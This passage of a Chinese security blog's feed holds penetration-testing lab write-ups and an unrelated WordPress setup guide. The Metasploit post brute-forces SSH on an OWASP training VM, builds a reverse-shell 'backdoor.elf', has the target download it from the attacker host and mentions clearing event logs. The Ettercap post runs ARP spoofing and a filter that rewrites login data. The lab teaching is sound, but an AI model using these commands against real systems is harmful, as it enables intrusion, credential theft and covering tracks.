</span><br><span class="line">[*] Connected to msf. Connection <span class="built_in">type</span>: postgresql.</span><br><span class="line">msf6 &gt; </span><br></pre></td></tr></table></figure>
<h2 id="使用-nmap-对目标主机进行探测扫描">2、使用 NMAP
对目标主机进行探测扫描</h2>
<p><strong>（1）命令</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; db_nmap -sV -p 21,22,23,25,80,443,445  10.10.10.129</span><br></pre></td></tr></table></figure>
<p><strong>（2）参数说明</strong></p>
<ul>
<li>-sV：对目标主机的服务进行扫描</li>
<li>-P：对目标的端口进行扫描</li>
</ul>
<p><strong>（3）扫描结果</strong></p>
<ul>
<li>使用services命令列出在目标端口上运行的服务</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">  msf6 &gt; services</span><br><span class="line">  Services</span><br><span class="line">  ========</span><br><span class="line">  host          port  proto  name         state   info</span><br><span class="line">  ----          ----  -----  ----         -----   ----</span><br><span class="line">  10.10.10.129  21    tcp    ftp          open    vsftpd 2.2.2</span><br><span class="line">  10.10.10.129  22    tcp    ssh          open    OpenSSH 5.3p1 Debian 3ubuntu4 Ubuntu Linux; protocol 2.0</span><br><span class="line">  10.10.10.129  23    tcp    telnet       closed</span><br><span class="line">  10.10.10.129  25    tcp    smtp         closed</span><br><span class="line">  10.10.10.129  80    tcp    http         open    Apache httpd 2.2.14 (Ubuntu) mod_mono /2.4.3 PHP/5.3.2-1ubuntu4.5 with Suhosin-Patch mod_python/3.3.1 Python/2.6.5 mod_perl/2.0.4 Perl/v5.10.1</span><br><span class="line">  10.10.10.129  443   tcp    https        closed</span><br><span class="line">  10.10.10.129  445   tcp    netbios-ssn  open    Samba smbd 3.X - 4.X workgroup: WORKGROUP</span><br><span class="line">  msf6 &gt; </span><br><span class="line"></span><br><span class="line">* 可以使用services -u命令对当前运行的服务进行过滤</span><br><span class="line"></span><br><span class="line">  msf6 &gt; services -u</span><br><span class="line">  Services</span><br><span class="line">  ========</span><br><span class="line">  host          port  proto  name         state  info</span><br><span class="line">  ----          ----  -----  ----         -----  ----</span><br><span class="line">  10.10.10.129  21    tcp    ftp          open   vsftpd 2.2.2</span><br><span class="line">  10.10.10.129  22    tcp    ssh          open   OpenSSH 5.3p1 Debian 3ubuntu4 Ubuntu Linux; protocol 2.0</span><br><span class="line">  10.10.10.129  80    tcp    http         open   Apache httpd 2.2.14 (Ubuntu) mod_mono/2.4.3 PHP/5.3.2-1ubuntu4.5 with Suhosin-Patch mod_python/3.3.1 Python/2.6.5 mod_perl/2.0.4 Perl/v5.10.1</span><br><span class="line">  10.10.10.129  445   tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: WORKGROUP</span><br><span class="line">  msf6 &gt; </span><br><span class="line"></span><br><span class="line">* 可以使用hosts命令列出数据库中所有的主机</span><br><span class="line"></span><br><span class="line">  msf6 &gt; hosts </span><br><span class="line">  Hosts</span><br><span class="line">  =====</span><br><span class="line">  address    mac        name       os_name  os_flavor  os_sp  purpose  info  comments</span><br><span class="line">  -------    ---        ----       -------  ---------  -----  -------  ----  --------</span><br><span class="line">  10.10.10.129   00:0c:29:de:5d:ba    www.dvssc.com   Linux                      server</span><br><span class="line">  msf6 &gt; </span><br></pre></td></tr></table></figure>
<p><strong>（4）端口状态说明</strong></p>
<ul>
<li>open：端口是开放的。</li>
<li>closed：端口是关闭的。</li>
<li>filtered：端口被防火墙IDS/IPS屏蔽，无法确定其状态。</li>
<li>unfiltered：端口没有被屏蔽，但是否开放需要进一步确定。</li>
<li>open|filtered：端口是开放的或被屏蔽。</li>
<li>closed|filtered ：端口是关闭的或被屏蔽。</li>
</ul>
<h1 id="威胁建模漏洞分析">2. 威胁建模+漏洞分析</h1>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211016154533335-1497778743.png" /></p>
<ul>
<li>通过各种渠道收集对应服务存在的漏洞，比如 ssh
服务，或许可被远程爆破登录，VSFTPD 2.3.4 存在命令执行漏洞等</li>
<li>此处以ssh服务为例，远程爆破 ssh 的登录账号及密码，获得 shell</li>
</ul>
<h1 id="渗透攻击">3. 渗透攻击</h1>
<h2 id="search-相应爆破登录模块">1、search 相应爆破登录模块</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; search ssh</span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"><span class="comment"># Name Disclosure Date Rank Check Description</span></span><br><span class="line">- ---- --------------- ---- ----- -----------</span><br><span class="line">0 exploit/linux/http/alienvault_exec 2017-01-31 excellent Yes AlienVault OSSIM/USM Remote Code Execution</span><br><span class="line">1 auxiliary/scanner/ssh/apache_karaf_command_execution 2016-02-09 normal No Apache Karaf Default Credentials Command Execution</span><br><span class="line">2 auxiliary/scanner/ssh/karaf_login normal No Apache Karaf Login Utility</span><br><span class="line">…………</span><br><span class="line">45 auxiliary/scanner/ssh/ssh_login normal No SSH Login Check Scanner</span><br><span class="line">…………</span><br><span class="line">msf6 &gt; use auxiliary/scanner/ssh/ssh_login</span><br></pre></td></tr></table></figure>
<h2 id="配置相应参数">2、配置相应参数</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; show options</span><br><span class="line">Module options (auxiliary/scanner/ssh/ssh_login):</span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">---- --------------- -------- -----------</span><br><span class="line">BLANK_PASSWORDS <span class="literal">false</span> no Try blank passwords <span class="keyword">for</span> all <span class="built_in">users</span></span><br><span class="line">BRUTEFORCE_SPEED 5 <span class="built_in">yes</span> How fast to bruteforce, from 0 to 5</span><br><span class="line">DB_ALL_CREDS <span class="literal">false</span> no Try each user/password couple stored <span class="keyword">in</span> the current database</span><br><span class="line">DB_ALL_PASS <span class="literal">false</span> no Add all passwords <span class="keyword">in</span> the current database to the list</span><br><span class="line">DB_ALL_USERS <span class="literal">false</span> no Add all <span class="built_in">users</span> <span class="keyword">in</span> the current database to the list</span><br><span class="line">PASSWORD no A specific password to authenticate with</span><br><span class="line">PASS_FILE no File containing passwords, one per line</span><br><span class="line">RHOSTS <span class="built_in">yes</span> The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">RPORT 22 <span class="built_in">yes</span> The target port STOP_ON_SUCCESS <span class="literal">false</span> <span class="built_in">yes</span> Stop guessing when a credential work s <span class="keyword">for</span> a host</span><br><span class="line">THREADS 1 <span class="built_in">yes</span> The number of concurrent threads (max one per host)</span><br><span class="line">USERNAME no A specific username to authenticateas</span><br><span class="line">USERPASS_FILE no File containing <span class="built_in">users</span> and passwords separated by space, one pair per line</span><br><span class="line">USER_AS_PASS <span class="literal">false</span> no Try the username as the password <span class="keyword">for</span> all <span class="built_in">users</span></span><br><span class="line">USER_FILE no File containing usernames, one per line</span><br><span class="line">VERBOSE <span class="literal">false</span> <span class="built_in">yes</span> Whether to <span class="built_in">print</span> output <span class="keyword">for</span> all attempts</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> rhosts 10.10.10.129</span><br><span class="line">rhosts =&gt; 10.10.10.129</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> user_file <span class="string">&quot;/home/z9m8r8/test/user_pass.txt&quot;</span></span><br><span class="line">user_file =&gt; /home/z9m8r8/test/user_pass.txt</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> pass_file <span class="string">&quot;/home/z9m8r8/test/user_pass.txt&quot;</span></span><br><span class="line">pass_file =&gt; /home/z9m8r8/test/user_pass.txt</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> threads 10</span><br><span class="line">threads =&gt; 10</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt;</span><br></pre></td></tr></table></figure>
<h2 id="攻击获得-shell">3、攻击获得 shell</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; run</span><br><span class="line">[*] 10.10.10.129:22 - Starting bruteforce</span><br><span class="line">[+] 10.10.10.129:22 - Success: <span class="string">&#x27;root:owaspbwa&#x27;</span> <span class="string">&#x27;uid=0(root) gid=0(root) groups=0(root) Linux owaspbwa 2.6.32-25-generic-pae #44-Ubuntu SMP Fri Sep 17 21:57:48 UTC 2010 i686 GNU/Linux &#x27;</span></span><br><span class="line">[*] Command shell session 2 opened (10.10.10.128:34583 -&gt; 10.10.10.129:22) at 2021-09-15 16:19:51 +0800</span><br><span class="line">[+] 10.10.10.129:22 - Success: <span class="string">&#x27;user:owaspbwa&#x27;</span> <span class="string">&#x27;uid=1000(user) gid=1000(user) groups=4(adm),20(dialout),24(cdrom),46(plugdev),111(sambashare),116(lpadmin),117(admin),1000(user) Linux owaspbwa 2.6.32-25-generic-pae #44-Ubuntu SMP Fri Sep 17 21:57:48 UTC 2010 i686 GNU/Linux &#x27;</span></span><br><span class="line">[*] Command shell session 3 opened (10.10.10.128:34885 -&gt; 10.10.10.129:22) at 2021-09-15 16:21:39 +0800</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; sessions</span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line">Id Name Type Information Connection</span><br><span class="line">-- ---- ---- ----------- ----------</span><br><span class="line">2 shell linux SSH root:owaspbwa (10.10.10. 10.10.10.128:34583 -&gt; 10.10.1</span><br><span class="line">129:22) 0.129:22 (10.10.10.129)</span><br><span class="line">3 shell linux SSH user:owaspbwa (10.10.10. 10.10.10.128:34885 -&gt; 10.10.1</span><br><span class="line">129:22) 0.129:22 (10.10.10.129)</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; sessions -i 2</span><br><span class="line">[*] Starting interaction with 2...</span><br><span class="line">stdin: is not a <span class="built_in">tty</span></span><br><span class="line">Welcome to the OWASP Broken Web Apps VM</span><br><span class="line">!!! This VM has many serious security issues. We strongly recommend that you run</span><br><span class="line">it only on the <span class="string">&quot;host only&quot;</span> or <span class="string">&quot;NAT&quot;</span> network <span class="keyword">in</span> the VM settings !!!</span><br><span class="line">You can access the web apps at http://10.10.10.129/</span><br><span class="line">You can administer / configure this machine through the console here, by SSHing</span><br><span class="line">to 10.10.10.129, via Samba at \\10.10.10.129\, or via phpmyadmin at</span><br><span class="line">http://10.10.10.129/phpmyadmin.</span><br><span class="line">In all these cases, you can use username <span class="string">&quot;root&quot;</span> and password <span class="string">&quot;owaspbwa&quot;</span>.</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/root</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>由上图知仅获得了目标的一个 shell
控制，为此进行以下操作提权</strong></li>
</ul>
<h2 id="获取meterpreter-命令行">4、 <strong>获取Meterpreter
命令行</strong></h2>
<p><strong>（1）创建 Meterpreter 攻击载荷</strong></p>
<ul>
<li>命令</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@promote:/var/www/html<span class="comment"># msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.128 LPORT=4444 -f elf &gt;backdoor.elf</span></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload</span><br><span class="line">[-] No <span class="built_in">arch</span> selected, selecting <span class="built_in">arch</span>: x86 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 123 bytes</span><br><span class="line">Final size of elf file: 207 bytes</span><br><span class="line">root@promote:/var/www/html<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<ul>
<li>参数说明</li>
</ul>
<p>参数-p指定需要使用的攻击载荷， LHOST指定我们自己计算机的IP地址，
LPORT指定我们自己的端口。backdoor.elf文件将会在目标计算机上连接刚才我们设定的IP地址和端口，并提供一个目标计算机上的Meterpreter权限。参数-
f定义了输出类型， elf是一种基于Linux类型系统的默认扩展名。</p>
<ul>
<li>启动攻击机 Apache服务</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@promote:/var/www/html<span class="comment"># service apache2 start</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>注意，需要将 backdoor.elf 放置在 /var/www/html/
目录下</strong></li>
</ul>
<p><strong>（2）让目标系统从我们的计算机中下载这个木马文件</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://10.10.10.128/backdoor.elf</span><br><span class="line">--2021-09-15 04:41:53-- http://10.10.10.128/backdoor.elf</span><br><span class="line">Connecting to 10.10.10.128:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 207</span><br><span class="line">Saving to: `backdoor.elf<span class="string">&#x27;</span></span><br><span class="line"><span class="string">0K 100% 44.1M=0s</span></span><br><span class="line"><span class="string">2021-09-15 04:41:53 (44.1 MB/s) - `backdoor.elf&#x27;</span> saved [207/207]</span><br></pre></td></tr></table></figure>
<p><strong>（3）攻击机启动监听</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; show options</span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">---- --------------- -------- -----------</span><br><span class="line">Payload options (generic/shell_reverse_tcp):</span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">---- --------------- -------- -----------</span><br><span class="line">LHOST <span class="built_in">yes</span> The listen address (an interface may be specifi</span><br><span class="line">ed)</span><br><span class="line">LPORT 4444 <span class="built_in">yes</span> The listen port</span><br><span class="line">Exploit target:</span><br><span class="line">Id Name</span><br><span class="line">-- ----</span><br><span class="line">0 Wildcard Target</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 10.10.10.128</span><br><span class="line">lhost =&gt; 10.10.10.128</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; linux/x86/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit</span><br><span class="line">[*] Started reverse TCP handler on 10.10.10.128:4444</span><br></pre></td></tr></table></figure>
<p><strong>（4）在目标系统上对木马赋予执行权限，并执行</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 777 backdoor.elf</span><br><span class="line">./backdoor.elf</span><br></pre></td></tr></table></figure>
<h2 id="结果">5、结果</h2>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211016155509718-53784424.png" /></p>
<h1 id="后渗透攻击">4. 后渗透攻击</h1>
<h2 id="内网渗透">1、内网渗透</h2>
<p>简述：在已控制的主机上收集路由信息，并在已经成功渗透的主机上使用autoroute命令来设置跳板，对其内网进行如上类似操作。</p>
<h2 id="渗透访问控制的持久化">2、渗透访问控制的持久化</h2>
<p><strong>运行persistence模块即可</strong></p>
<h2 id="清楚渗透痕迹">3、清楚渗透痕迹</h2>
<p><strong>可在Meterpreter命令行中输入clearv命令清除目标系统的事件日志。</strong></p>
<h1 id="参考文献"><strong>5. 参考文献：</strong></h1>
<p><strong>《精通Metasploit渗透测试》</strong></p>
]]></content>
      <categories>
        <category>精通Metasploit渗透测试 第2版</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>中间人攻击实验</title>
    <url>/2021/09/29/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<h2 id="简介">1. 简介</h2>
<p>中间人（ MITM） 攻击是一种攻击类型， 其中攻击者将它自己放到两方之间，
通常是客户端和服务端通信线路的中间。
这可以通过破坏原始频道之后拦截一方的消息并将它们转发（ 有时会有改变）
给另一方来实现。</p>
<p><strong>举例：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20210929200829243-2113533028.png" /></p>
<p>Alice 连接到了 Web 服务器上， Bob打算了解 Alice 正在发送什么信息。
于是 Bob 建立 MITM攻击， 通过告诉服务器他是 Alice， 并且告诉 Alice
他是服务器。 现在， 所有 Alice 的请求都会发给 Bob， Bob
会将它们转发给服务器， 并对服务器的响应做相同操作。 这样， Bob
就能够拦截、 读取或修改所有 Alice 和服务器之间的流量。</p>
<h2 id="实例arp欺骗与mitm">2. 实例：ARP欺骗与MITM</h2>
<h3 id="实验环境">1、实验环境：</h3>
<p>Kali（Bob）: 10.10.10.128</p>
<p>OWASP（Web server）: 10.10.10.134</p>
<p>win-xp（Alice）: 10.10.10.131</p>
<h3 id="利用-ettercap-进行arp欺骗截获账号密码">2、利用 Ettercap
进行ARP欺骗，截获账号，密码</h3>
<p><strong>（1）kali 终端打开 Ettercap 命令</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ettercap -G</span><br></pre></td></tr></table></figure>
<p><strong>（2）其他操作如下图所示</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20210929201102388-1598315813.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20210929201129409-638412946.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20210929201137603-1079184624.png" /></p>
<p><strong>（3）ARP 欺骗前XP和OWASP情况</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20210929201148823-1069426376.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20210929201157437-1896695984.png" /></p>
<p><strong>（4）进行 ARP 欺骗：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20210929201213033-464809854.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20210929201218532-1927183687.png" /></p>
<p><strong>（5）欺骗结果：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20210929201228255-1420527915.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20210929201231741-994725308.png" /></p>
<p><img data-src="C:\Users\86182\AppData\Local\YNote\data\yd.2adc5251eb314917a\35140ed271a84bdca390427c2210933d\%%5B6fyn0ao%5Daa%5Bvsf$b66n@y.png" /></p>
<p><strong>（6）XP 浏览 http://10.10.10.134/dvwa/ 并登录</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20210929201244830-374876170.png" /></p>
<p><strong>（7）用户名，密码被截获</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20210929201254250-832534007.png" /></p>
<p><strong>（8）也可用wireshark抓包获取跟详细的信息，如下图：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20210929201301369-840066677.png" /></p>
<h3
id="修改服务端和客户端之间的数据接上述实验">3、修改服务端和客户端之间的数据（接上述实验）</h3>
<p><strong>（1）创建过滤器文件（regex-replace-filter.filter）</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (ip.dst == <span class="string">&#x27;10.10.10.134&#x27;</span>&amp;&amp; tcp.dst == <span class="number">80</span>)   </span><br><span class="line">　&#123;   </span><br><span class="line">　　<span class="keyword">if</span> (search(DATA.data, <span class="string">&quot;POST&quot;</span>))  </span><br><span class="line">　　　　&#123; msg(<span class="string">&quot;POST request&quot;</span>);   </span><br><span class="line">　　<span class="keyword">if</span> (search(DATA.data, <span class="string">&quot;login.php&quot;</span>) )  </span><br><span class="line">　　　　&#123;   </span><br><span class="line">　　　　　　msg(<span class="string">&quot;Call to login page&quot;</span>);   </span><br><span class="line">　　　　　　pcre_regex(DATA.data, <span class="string">&quot;Content-Length\:\ [0-9]*&quot;</span>,<span class="string">&quot;Content-Length: 41&quot;</span>) ;   </span><br><span class="line">　　　　　　msg(<span class="string">&quot;Content Length modified&quot;</span>);   </span><br><span class="line">　　　　　　<span class="keyword">if</span> (pcre_regex(DATA.data, <span class="string">&quot;username=[a-zAZ]*&amp;&quot;</span>,<span class="string">&quot;username=admin&amp;&quot;</span>))   </span><br><span class="line">　　　　　　　　&#123; msg(<span class="string">&quot;DATA modified\n&quot;</span>); &#125;   </span><br><span class="line">　　　　　　msg(<span class="string">&quot;Filter Ran.\n&quot;</span>);  </span><br><span class="line">　　　　 &#125;   </span><br><span class="line">　　　　&#125;  </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p><strong>（2）编译 regex-replace-filter.filter 生成
regex-replace-filter.ef（Kali终端）</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">etterfilter -o regex-replace-filter.ef regex-replace-filter.filter</span><br></pre></td></tr></table></figure>
<p><strong>（3）结果如图所示：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20210929201320761-1350812828.png" /></p>
<p><strong>（4）Ettercap 加载并使用（菜单选择：Filters | Load a
filter</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20210929201331211-1826413946.png" /></p>
<p><strong>（5）XP 浏览 http://10.10.10.134/dvwa/ 并使用 "密码" admin
登陆"任意用户"，如test：admin</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20210929201350622-1679860210.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20210929201358789-534297445.png" /></p>
<p><strong>（6）用户现在登陆为管理员，如下图：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20210929201403683-713873202.png" /></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>中间人攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>个人博客网站搭建——以wordpress博客搭建为例</title>
    <url>/2022/02/12/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94%E4%BB%A5wordpress%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B8%BA%E4%BE%8B/</url>
    <content><![CDATA[<h2 id="注册域名">1. 注册域名</h2>
<p><strong>阿里云：<a href="https://wanwang.aliyun.com/"
class="uri">https://wanwang.aliyun.com/</a></strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220212144758255-1410737047.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220212144811945-1650301510.png" /></p>
<p><strong>域名实名认证（备案所需）：<a
href="https://help.aliyun.com/document_detail/102097.html"
class="uri">https://help.aliyun.com/document_detail/102097.html</a></strong></p>
<h2 id="购买服务器">2. 购买服务器</h2>
<p><strong>阿里云：</strong><a
href="https://www.aliyun.com/activity?spm=5176.8789780.J_8058803260.2.5be045b5eBIp6k"
class="uri">https://www.aliyun.com/activity?spm=5176.8789780.J_8058803260.2.5be045b5eBIp6k</a></p>
<p><strong>学生机：</strong><a
href="https://developer.aliyun.com/plan/grow-%20up?spm=5176.21103406.J_6174043250.2.54ce17193rYsCi&amp;scm=20140722.M_6005620.P_3428.MO_464-ID_6005620-MID_6005620-CID_21952-ST_3603-V_1">https://developer.aliyun.com/plan/grow-
up?spm=5176.21103406.J_6174043250.2.54ce17193rYsCi&amp;scm=20140722.M_6005620.P_3428.MO_464-ID_6005620-MID_6005620-CID_21952-ST_3603-V_1</a></p>
<p><strong>服务器选择：</strong></p>
<p><a
href="https://developer.aliyun.com/article/575016?spm=5176.21213303.J_6704733920.7.96813edaUf8xnZ&amp;scm=20140722.S_community%40%40%E6%96%87%E7%AB%A0%40%40575016._.ID_community%40%40%E6%96%87%E7%AB%A0%40%40575016-RL_ECS%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8E%E8%BD%BB%E9%87%8F%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8-LOC_main-%20OR_ser-V_2-P0_0">什么是轻量应用服务器？与阿里云ecs和虚拟主机有什么区别？</a></p>
<p><a
href="https://developer.aliyun.com/article/858359?spm=5176.21213303.J_6704733920.13.37713edaaiMvwV&amp;scm=20140722.S_community%40%40%E6%96%87%E7%AB%A0%40%40858359._.ID_community%40%40%E6%96%87%E7%AB%A0%40%40858359-RL_ECS%20%20%20%E8%BD%BB%E9%87%8F%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8-LOC_main-%20OR_ser-V_2-P0_2">阿里云服务器ECS和轻量应用服务器有什么不同</a></p>
<p>个人选择的是：轻量应用服务器</p>
<p><strong>配置选择：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220212150559444-1480032358.png" /></p>
<p>我这边选择的镜像是BT-Panel，后期建站及管理都比较方便，至于其他配置依据个人需求来选即可。</p>
<h2 id="网站备案">3. 网站备案</h2>
<p><strong>备案简介：</strong><a href="https://beian.aliyun.com/"
class="uri">https://beian.aliyun.com/</a></p>
<p><strong>阿里云备案指导</strong> ：<a
href="https://help.aliyun.com/product/35468.html"
class="uri">https://help.aliyun.com/product/35468.html</a></p>
<p><strong>1、ICP备案简略版：</strong><a
href="https://developer.aliyun.com/article/775181"
class="uri">https://developer.aliyun.com/article/775181</a></p>
<p>网站已完成工信部ICP备案，或网站部署在非中国内地的服务器上，但可以在中国内地（大陆）访问该网站，则必须办理公安联网备案。</p>
<p><strong>2、公安备案指导：</strong><a
href="https://help.aliyun.com/document_detail/116029.html"
class="uri">https://help.aliyun.com/document_detail/116029.html</a></p>
<h2 id="域名解析">4. 域名解析</h2>
<p><strong>域名解析指导</strong> ：<a
href="https://help.aliyun.com/document_detail/29716.html"
class="uri">https://help.aliyun.com/document_detail/29716.html</a></p>
<p><strong>注意：备案前一定不要做解析（如果已做一定要关闭/暂停），否则会影响备案的审核！！！</strong></p>
<h2 id="博客搭建">5. 博客搭建</h2>
<p><strong>宝塔面板搭建WordPress网站新手教程：<a
href="https://www.vpssw.com/12.html#wu_yu_ming_jie_xi_bang_ding"
class="uri">https://www.vpssw.com/12.html#wu_yu_ming_jie_xi_bang_ding</a></strong></p>
<h2 id="博客相关配置">6. 博客相关配置</h2>
<h3 id="个人资料更新">1、个人资料更新</h3>
<p><strong>…………</strong></p>
<h3 id="主题设置">2、主题设置</h3>
<p><strong>WordPress 开源免费主题推荐：<a
href="https://ztlcoder.com/categories/code/articles/26"
class="uri">https://ztlcoder.com/categories/code/articles/26</a></strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220212160831060-96415679.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220212160845317-722916348.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220212160856573-1309708429.png" /></p>
<h3 id="插件使用">3、插件使用</h3>
<p><strong>编辑器：</strong> 经典编辑器 + Advanced Editor Tools
(previously TinyMCE Advanced)</p>
<p><strong>编辑器安装完的自定义配置：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220212162025963-845030178.png" /></p>
<p><strong>邮件： </strong>WP Mail SMTP</p>
<p>配置注意：SMTP 密码不是登陆密码而是对应SMTP的授权码</p>
<p>如果想自定义个人头像等可以使用User Profile Picture插件。</p>
<h3 id="安全配置务必配置">4、安全配置（务必配置）</h3>
<p><strong>插件推荐：iThemes Security</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220212162505347-934587542.png" /></p>
<p>具体的安全措施需要根据个人的实际情况来设置。</p>
<p><strong>解决xmlrpc.php被攻击:&lt;https://www.yizhiyong.com/tutorial/how-to-solve-xmlrpc-php-
attack.html&gt;</strong></p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>Blog</tag>
      </tags>
  </entry>
  <entry>
    <title>主动信息收集之SMB扫描</title>
    <url>/2021/12/04/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BSMB%E6%89%AB%E6%8F%8F/</url>
